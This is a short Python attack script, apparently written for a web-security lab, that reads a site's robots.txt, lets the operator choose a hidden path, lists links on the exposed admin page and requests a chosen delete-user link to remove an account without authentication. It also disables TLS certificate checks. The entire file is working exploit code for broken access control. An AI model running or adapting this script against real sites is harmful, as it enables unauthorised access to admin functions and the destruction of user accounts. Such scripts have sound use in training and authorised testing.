import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
def path_to_attack(robots_file):
    
    lines = robots_file.split("\n")

    print("\nContent of robots.txt file:\n")
    for i in range(len(lines)):
        print(f"{i+1}. {lines[i].strip()}")
    print("\nWhat line do you want to attack?: ", end="")
    line = int(input())
    return lines[line-1].split(":")[1].strip()
    
def access_robots(url):
    payload = "robots.txt"
    r = requests.get(url + payload, verify=False)
    return r.text
    
def anchor_to_attack(url,uri):
    r = requests.get(url+uri[1:], verify=False)
    a = BeautifulSoup(r.text,"html.parser").find_all('a', href=True)
    
    print("\nAvailable links to attack:\n")
    for i in range(len(a[len(a)-2:])):
        print(f"{i+1}. {a[len(a)-2:][i]['href']} ") 
    print("\nSelect an href to attack:", end="")
    link_to_attack = int(input())
    return a[len(a)-2:][link_to_attack-1]['href'] 

def delete_user(url, anchor):
    
    print("(+) Found the administrator panel!")
    print("(+) Deleting user...")
    r = requests.get(url+anchor[1:], verify=False)
    if r.status_code == 200 and "delete" in anchor:
        print("(+) User deleted!")
    else:
        print("(-) Could not delete")

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)
        
    url = sys.argv[1]
    print("(+) Finding admin panel...")
    robots_file = access_robots(url)
    uri = path_to_attack(robots_file)
    anchor = anchor_to_attack(url, uri)
    delete_user(url, anchor)
    
if __name__ == "__main__":
    main()